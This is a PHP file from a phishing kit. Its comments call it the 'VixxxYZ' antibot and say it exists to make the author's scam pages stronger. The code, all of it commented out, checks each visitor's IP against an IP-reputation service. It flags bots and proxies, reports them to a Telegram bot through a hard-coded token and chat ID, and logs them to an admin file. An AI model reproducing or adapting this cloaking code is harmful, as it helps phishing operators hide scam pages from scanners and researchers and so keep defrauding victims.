<?php 
//this page is the part of VixxxYZ 2022 Antibot model this page is used detect proxies and bots and other bad ips and send to t.me/VixxxYZ Telegram bot as a bot ip address so my scamas can be more stronger...
//this page just sends bad ip no other info is sent fron the page
// $ch=curl_init(); 
// 	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
// 	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
// 	curl_setopt($ch,CURLOPT_URL,"https://check.getipintel.net/check.php?ip=".$_SESSION['ip']."&contact=s@jsjsss.fuckoffbitch");
// 	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
// 	curl_setopt($ch,CURLOPT_TIMEOUT,400);
// 	$json=curl_exec($ch);
// 	 $json2 = json_decode($json);
	
//      if($json2==0 or $json2==1){
//         $mess .= '| BOT/PROXY/HOSTING/BAD  IP DETECTED   BY @VixxxYZ   '."\r \n";
//         $mess .=  '| IP  | '. $_SESSION['ip'] .'  -->'."\r\n";
       
//         $mess .=  '|   BOT USERAGENT  | '.$_SERVER['HTTP_USER_AGENT']."\r \n";
//         $mess .=  '--->    SCAMA BY T.ME/VixxxYZ  <-- ';
//         $msg =urlencode($mess);
//         $token ="5050719374:AAHdO2gXMLa8hNQfaUc11AsWNnWmobnkzxE";// @VixxxYZ Bot for bad ip  ONLY
//         $id =5006477848;// @VixxxYZ ID for bad ip  ONLY
//         $url = "https://api.telegram.org/bot$token/sendmessage?chat_id=$id&text=".$msg;
//         $curl = curl_init();
//             // curl_setopt ($curl, CURLOPT_PORT , 8089);
//             curl_setopt($curl, CURLOPT_URL, $url);
//             curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
//             curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        
//             $response = curl_exec($curl);   
//             $content = "\r\n#BAD VISIT  ->".$_SESSION['ip'];
//             $save=fopen("../admin/bot.txt","a+");
//             fwrite($save,$content);
//             fclose($save);

//      }
// @COPYRIGHT T.ME/VIXXXYZ ANTIBOT 20222 V1.0